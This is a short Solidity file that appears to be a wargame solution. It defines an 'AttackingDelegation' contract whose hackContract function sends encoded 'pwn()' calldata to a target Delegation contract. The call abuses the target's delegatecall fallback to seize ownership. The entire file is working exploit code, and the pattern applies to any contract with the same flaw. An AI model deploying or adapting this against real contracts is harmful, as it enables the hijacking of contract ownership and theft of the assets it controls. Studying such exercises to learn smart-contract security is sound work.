// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public owner;
    Delegation public delegation;

    constructor(address _contractAddress) {
        delegation = Delegation(_contractAddress);
        owner = msg.sender;
    }

     function hackContract() external {
        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(delegation).call(payload);
        require(success, "Attack failed");
    }
}